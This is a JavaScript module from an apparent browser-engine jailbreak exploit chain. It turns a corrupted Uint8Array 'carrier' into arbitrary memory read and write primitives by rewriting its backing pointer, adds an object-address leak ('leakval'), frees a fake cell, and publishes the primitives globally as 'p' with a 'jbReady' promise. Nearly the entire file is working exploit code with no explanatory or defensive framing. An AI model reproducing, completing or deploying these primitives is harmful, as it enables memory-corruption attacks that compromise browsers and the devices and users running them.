import { int64 } from "./int64.js";
import { carrierHomeVector, releaseFakeCell } from "./core.js?v=final";

let carrier = null;
let originalVector = NaN;
let leakSlotAddress = NaN;
let leakSetter = null;
let leakClearer = null;

const pairStatus = {
  promoted: false,
  released: false,
  error: "primitive not installed"
};

function isAddressLike(address) {
  return (address instanceof int64)
    || (typeof address === "number" && Number.isFinite(address))
    || !!(address && typeof address.low === "number" && typeof address.hi === "number");
}

function toAddressNumber(address) {
  if (address instanceof int64)
    return address.low + address.hi * 0x100000000;
  if (typeof address === "number" && Number.isFinite(address))
    return address;
  if (address && typeof address.low === "number" && typeof address.hi === "number")
    return (address.low >>> 0) + (address.hi >>> 0) * 0x100000000;
  throw new TypeError("invalid address");
}

function toInt64Address(address) {
  if (address instanceof int64)
    return address;
  const value = toAddressNumber(address);
  const hi = Math.floor(value / 0x100000000);
  return new int64((value - hi * 0x100000000) >>> 0, hi >>> 0);
}

function carrierView() {
  if (!(carrier instanceof Uint8Array))
    throw new Error("Carrier not initialized");
  return carrier;
}

function writeAddressBytes(view, address) {
  const value = toAddressNumber(address);
  const hi = Math.floor(value / 0x100000000);
  const lo = value - hi * 0x100000000;
  view[0x10] = lo & 0xff;
  view[0x11] = (lo >>> 8) & 0xff;
  view[0x12] = (lo >>> 16) & 0xff;
  view[0x13] = (lo >>> 24) & 0xff;
  view[0x14] = hi & 0xff;
  view[0x15] = (hi >>> 8) & 0xff;
  view[0x16] = (hi >>> 16) & 0xff;
  view[0x17] = (hi >>> 24) & 0xff;
}

function initCarrier(viewOrCarrier, origVec, leakAddr = NaN, setLeak = null, clearLeak = null) {
  if (viewOrCarrier && viewOrCarrier.view instanceof Uint8Array) {
    carrier = viewOrCarrier.view;
    originalVector = toAddressNumber(
      typeof clearLeak === "function" || typeof setLeak === "function"
        ? origVec
        : (isAddressLike(arguments[2]) ? arguments[2] : origVec)
    );
    leakSlotAddress = isAddressLike(viewOrCarrier.leakSlotAddress)
      ? toAddressNumber(viewOrCarrier.leakSlotAddress)
      : (isAddressLike(leakAddr) ? toAddressNumber(leakAddr) : NaN);
    leakSetter = typeof viewOrCarrier.setLeakSlot === "function"
      ? viewOrCarrier.setLeakSlot.bind(viewOrCarrier)
      : (typeof setLeak === "function" ? setLeak : null);
    leakClearer = typeof viewOrCarrier.clearLeakSlot === "function"
      ? viewOrCarrier.clearLeakSlot.bind(viewOrCarrier)
      : (typeof clearLeak === "function" ? clearLeak : null);
    return;
  }

  if (!(viewOrCarrier instanceof Uint8Array))
    throw new TypeError("carrier view must be a Uint8Array");
  carrier = viewOrCarrier;
  originalVector = toAddressNumber(origVec);
  leakSlotAddress = isAddressLike(leakAddr) ? toAddressNumber(leakAddr) : NaN;
  leakSetter = typeof setLeak === "function" ? setLeak : null;
  leakClearer = typeof clearLeak === "function" ? clearLeak : null;
}

function aim(address) {
  writeAddressBytes(carrierView(), address);
}

function restore() {
  if (!Number.isFinite(originalVector))
    throw new Error("Cannot restore carrier");
  aim(originalVector);
}

function read1(addr) {
  aim(addr);
  return carrierView()[0];
}

function read2(addr) {
  aim(addr);
  const view = carrierView();
  return view[0] + (view[1] << 8);
}

function read4(addr) {
  aim(addr);
  const view = carrierView();
  return (view[0] + (view[1] << 8) + (view[2] << 16) + (view[3] << 24)) >>> 0;
}

function read8(addr) {
  aim(addr);
  const view = carrierView();
  const low = (view[0] + (view[1] << 8) + (view[2] << 16) + (view[3] << 24)) >>> 0;
  const high = (view[4] + (view[5] << 8) + (view[6] << 16) + (view[7] << 24)) >>> 0;
  return new int64(low, high);
}

function write1(addr, value) {
  aim(addr);
  carrierView()[0] = value & 0xff;
}

function write2(addr, value) {
  aim(addr);
  const view = carrierView();
  view[0] = value & 0xff;
  view[1] = (value >>> 8) & 0xff;
}

function write4(addr, value) {
  aim(addr);
  value = value >>> 0;
  const view = carrierView();
  view[0] = value & 0xff;
  view[1] = (value >>> 8) & 0xff;
  view[2] = (value >>> 16) & 0xff;
  view[3] = (value >>> 24) & 0xff;
}

function write8(addr, value) {
  aim(addr);
  const view = carrierView();
  const v = toInt64Address(value);
  view[0] = v.low & 0xff;
  view[1] = (v.low >>> 8) & 0xff;
  view[2] = (v.low >>> 16) & 0xff;
  view[3] = (v.low >>> 24) & 0xff;
  view[4] = v.hi & 0xff;
  view[5] = (v.hi >>> 8) & 0xff;
  view[6] = (v.hi >>> 16) & 0xff;
  view[7] = (v.hi >>> 24) & 0xff;
}

function leakval(obj) {
  if (!Number.isFinite(leakSlotAddress) || !leakSetter || !leakClearer) {
    if (typeof globalThis.leakAddress === "function" && globalThis.leakAddress !== leakval)
      return globalThis.leakAddress(obj);
    throw new Error("leakval: address leak not available");
  }
  leakSetter(obj);
  try {
    return read8(leakSlotAddress);
  } finally {
    leakClearer();
    try { restore(); } catch (_) { }
  }
}

function assertHome() {
  if (!(carrier instanceof Uint8Array)) return false;
  return carrier[0] === 0x3c;
}

function buildWindowP() {
  return {
    aim,
    restore,
    read1,
    read2,
    read4,
    read8,
    write1,
    write2,
    write4,
    write8,
    leakval,
    assertHome
  };
}

function installWindowP(coreCarrier, options = {}) {
  pairStatus.promoted = false;
  pairStatus.released = false;
  pairStatus.error = "";

  try {
    if (!coreCarrier || typeof coreCarrier !== "object")
      throw new TypeError("carrier is required");
    if (!(coreCarrier.view instanceof Uint8Array))
      throw new TypeError("carrier view is unavailable");

    initCarrier(
      coreCarrier.view,
      carrierHomeVector(),
      coreCarrier.leakSlotAddress,
      coreCarrier.setLeakSlot,
      coreCarrier.clearLeakSlot
    );

    const p = buildWindowP();
    globalThis.p = p;
    globalThis.leakAddress = leakval;
    globalThis.jbReady = Promise.resolve(p);

    const released = releaseFakeCell();
    pairStatus.promoted = true;
    pairStatus.released = !!(released && (released.alreadyReleased || released.released));

    const onEvent = typeof options.onEvent === "function" ? options.onEvent : null;
    if (onEvent)
      onEvent("WINDOW-P-READY", "released=" + (pairStatus.released ? "1" : "0"));

    return p;
  } catch (error) {
    pairStatus.error = error && error.message ? error.message : String(error);
    throw error;
  }
}

export {
  pairStatus,
  installWindowP,
  initCarrier,
  aim,
  restore,
  read1, read2, read4, read8,
  write1, write2, write4, write8,
  leakval,
  assertHome
};
